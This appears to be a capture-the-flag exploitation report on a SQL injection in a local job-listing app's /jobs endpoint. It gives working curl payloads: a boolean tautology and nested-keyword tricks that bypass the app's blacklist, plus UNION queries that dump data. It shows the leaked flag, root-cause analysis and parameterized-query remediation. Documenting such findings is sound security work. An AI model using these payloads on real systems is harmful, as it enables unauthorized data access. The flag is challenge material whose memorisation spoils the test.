# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-001: SQL Injection in Job Type Filter Bypass

**Summary:**
- **Vulnerable location:** POST /jobs endpoint, `job_type` parameter in request body at `main.py:42`
- **Overview:** SQL injection vulnerability allowing complete database access and extraction of sensitive data including CTF flag. The vulnerability exists due to unsafe f-string interpolation of user input directly into SQL queries, combined with an ineffective blacklist filter that can be bypassed using nested keywords.
- **Impact:** Complete database compromise with extraction of CTF flag `flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}` from hidden job entry. Attacker can read all database contents, enumerate schema, and potentially modify data.
- **Severity:** Critical

**Prerequisites:**
- Network access to http://localhost:8000/
- Ability to send POST requests with JSON payloads
- No authentication required (application is completely public)

**Exploitation Steps:**

**Step 1: Confirm SQL Injection Vulnerability**

Send a single quote to trigger SQL syntax error:

```bash
curl -X POST http://localhost:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"'"}'
```

**Expected Result:** HTTP 500 Internal Server Error (confirms SQL syntax error)

**Actual Result:** 
```
Internal Server Error
HTTP Status: 500
```

This confirms that the input reaches the SQL query without proper sanitization, causing a syntax error when an unescaped quote is injected.

**Step 2: Extract Flag Using Boolean-Based Injection Bypass**

The application blocks access to jobs with type "premium" via a hardcoded check at `main.py:45-47`. However, SQL injection allows bypassing this check. The blacklist filter removes uppercase "OR" and lowercase "or", but mixed-case "oR" passes through.

Execute the bypass payload:

```bash
curl -X POST http://localhost:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' oR '"'"'1'"'"'='"'"'1"}' \
  -s | python3 -m json.tool
```

**SQL Query Constructed:**
```sql
SELECT * FROM jobs WHERE type = '' oR '1'='1'
```

**Bypass Logic:**
- Input: `' oR '1'='1`
- Premium check: `' oR '1'='1` != `'premium'` → passes check
- Blacklist filter: `oR` (mixed case) not in blacklist → unchanged
- Final query: Boolean OR condition makes WHERE clause always true
- Result: Returns ALL jobs including hidden ones

**Actual Result:**
```json
[
    {
        "id": 1,
        "name": "Senior Frontend Dev",
        "type": "front-end",
        "description": "reactjs"
    },
    {
        "id": 2,
        "name": "Staff Backend Python",
        "type": "back-end",
        "description": "django"
    },
    {
        "id": 3,
        "name": "Hidden job",
        "type": "private",
        "description": "flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"
    },
    {
        "id": 4,
        "name": "Frontend Dev",
        "type": "front-end",
        "description": "angular"
    }
]
```

**Step 3: Fingerprint Database Version (UNION-Based Injection)**

Extract database version information using nested keyword bypass:

```bash
curl -X POST http://localhost:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNUNIONION SELSELECTECT sqlite_version() as id, '"'"'SQLite'"'"' as name, '"'"'database'"'"' as type, '"'"'version'"'"' as description--"}' \
  -s | python3 -m json.tool
```

**Bypass Technique:**
- `UNUNIONION` → blacklist removes `UNION` → leaves `UNION`
- `SELSELECTECT` → blacklist removes `SELECT` → leaves `SELECT`
- `--` comment at end terminates query (prevents syntax error from trailing quote)

**SQL Query Constructed:**
```sql
SELECT * FROM jobs WHERE type = '' UNION SELECT sqlite_version() as id, 'SQLite' as name, 'database' as type, 'version' as description--'
```

**Actual Result:**
```json
[
    {
        "id": "3.46.1",
        "name": "SQLite",
        "type": "database",
        "description": "version"
    }
]
```

**Database Fingerprint:** SQLite version 3.46.1

**Step 4: Enumerate Database Schema**

Extract complete table schema from sqlite_master system table:

```bash
curl -X POST http://localhost:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNUNIONION SELSELECTECT 1 as id, name as name, '"'"'table'"'"' as type, sql as description FRFROMOM sqlite_master WHWHEREERE type='"'"'table'"'"'--"}' \
  -s | python3 -m json.tool
```

**Bypass Technique:**
- Nested keywords: `FRFROMOM` → `FROM`, `WHWHEREERE` → `WHERE`
- These bypass the blacklist which only does single-pass replacement

**SQL Query Constructed:**
```sql
SELECT * FROM jobs WHERE type = '' UNION SELECT 1 as id, name as name, 'table' as type, sql as description FROM sqlite_master WHERE type='table'--'
```

**Actual Result:**
```json
[
    {
        "id": 1,
        "name": "jobs",
        "type": "table",
        "description": "CREATE TABLE jobs (\n        id INTEGER PRIMARY KEY,\n        name TEXT,\n        type TEXT,\n        description TEXT\n    )"
    }
]
```

**Database Schema Enumeration:**
- Table name: `jobs`
- Columns: `id` (INTEGER PRIMARY KEY), `name` (TEXT), `type` (TEXT), `description` (TEXT)

**Proof of Impact:**

**1. CTF Flag Captured:**
```
flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}
```

Successfully extracted from the "Hidden job" entry (ID: 3, type: "private") that was blocked by the application's access control mechanism.

**2. Complete Database Access Demonstrated:**
- Extracted all 4 job records including restricted entries
- Enumerated database version (SQLite 3.46.1)
- Extracted complete table schema from sqlite_master
- Confirmed single table "jobs" with 4 columns

**3. Access Control Bypass Confirmed:**
The application attempts to block access to restricted jobs at `main.py:45-47` with this check:
```python
if job_type and job_type == 'premium':
    return HTMLResponse(content=json.dumps({"detail": "Access denied"}), status_code=403)
```

This was completely bypassed via SQL injection, demonstrating that parameter-based access controls are ineffective when input reaches vulnerable SQL queries.

**4. Multiple Bypass Techniques Demonstrated:**
- **Case variation:** `oR` instead of `OR` or `or`
- **Nested keywords:** `UNUNIONION` → `UNION`, `SELSELECTECT` → `SELECT`
- **Boolean tautology:** `' oR '1'='1` makes WHERE clause always true
- **UNION-based injection:** Extracted arbitrary data using UNION SELECT

**Notes:**

**Root Cause Analysis:**

The vulnerability exists due to three compounding security failures:

1. **Unsafe Query Construction (main.py:53):**
```python
query = f"SELECT * FROM jobs WHERE type = '{job_type}'"
```
User input is directly interpolated into SQL string using Python f-strings, creating a classic SQL injection vulnerability.

2. **Ineffective Input Sanitization (main.py:49-50):**
```python
for word in ['OR', 'or', 'AND', 'and', 'SELECT', 'select', 'UNION', 'union', 'FROM', 'from', 'WHERE', 'where']:
    job_type = job_type.replace(word, '')
```
The blacklist filter has multiple bypass vectors:
- Non-recursive (single pass allows nested keywords)
- Case-sensitive pairs only (missing mixed-case variations)
- Incomplete keyword coverage (missing LIKE, GLOB, LIMIT, comments)

3. **Weak Access Control:**
Access control checks parameter values rather than user identity/roles, and occurs before SQL execution, making it bypassable through injection.

**Remediation Required:**

1. **Use Parameterized Queries (Immediate Fix):**
```python
# Replace main.py:53 with:
query = "SELECT * FROM jobs WHERE type = ?"
cursor.execute(query, (job_type,))
```

2. **Implement Whitelist Validation:**
```python
ALLOWED_TYPES = ['front-end', 'back-end']
if job_type and job_type not in ALLOWED_TYPES:
    return {"detail": "Invalid job type"}, 400
```

3. **Implement Proper Authentication/Authorization:**
Replace parameter-based access control with identity-based role checks after implementing an authentication system.

**Additional Vulnerabilities Observed:**

- **Stored XSS Risk:** The frontend renders database content via `innerHTML` without sanitization (`static/index.html:74`). SQL injection could be used to inject XSS payloads into the database that execute in victim browsers.
- **Information Disclosure:** Auto-generated API documentation at `/docs` and `/openapi.json` reveals complete API structure to attackers.
- **No Rate Limiting:** Unlimited exploitation attempts possible against the vulnerable endpoint.

**Business Impact:**

- Complete compromise of application data
- Exposure of sensitive CTF flag (equivalent to API keys, credentials, or PII in production)
- Potential for data modification/deletion
- Foundation for secondary attacks (XSS payload injection)
- No detection capability (no logging of suspicious queries)